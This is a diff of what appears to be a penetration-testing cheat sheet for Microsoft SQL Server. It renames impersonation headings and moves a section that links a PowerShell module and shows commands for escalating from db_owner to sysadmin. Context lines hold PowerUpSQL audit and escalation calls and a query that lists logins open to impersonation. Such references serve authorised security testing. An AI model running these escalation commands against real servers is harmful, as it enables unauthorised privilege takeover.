@@ -1355,7 +1355,7 @@ Get-SQLFuzzDomainAccount -Instance <COMPUTERNAME>\<INSTANCENAME>
 Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug
 ```
 
-#### Check if impersonation is possible manually
+#### Check if impersonation is possible
 ```
 -- Find users that can be impersonated
 SELECT distinct b.name
@@ -1365,14 +1365,7 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 ```
 
-#### Impersonate a user script
-- https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
-```
-Import-Module .\Invoke-SqlServerDbElevateDbOwner.psm1
-Invoke-SqlServerDbElevateDbOwner -SqlUser <USER> -SqlPass <PASSWORD> -SqlServerInstance <INSTANCE>
-```
-
-#### Impersonate a user manually
+#### Impersonate a user 
 - Might be possible to impersonate user a and then user b and then sa!
 ```
 -- Verify you are still running as the normal user login
@@ -1434,6 +1427,13 @@ invoke-SQLAudit
 invoke-SQLEscalatedPriv
 ```
 
+#### DB_Owner exploit script
+- https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
+```
+Import-Module .\Invoke-SqlServerDbElevateDbOwner.psm1
+Invoke-SqlServerDbElevateDbOwner -SqlUser <USER> -SqlPass <PASSWORD> -SqlServerInstance <INSTANCE>
+```
+ 
 ### Command execution
 ![image](https://user-images.githubusercontent.com/43987245/151711534-6114738f-6c9c-49b2-8c5f-0cb27f5fa6d0.png)
 
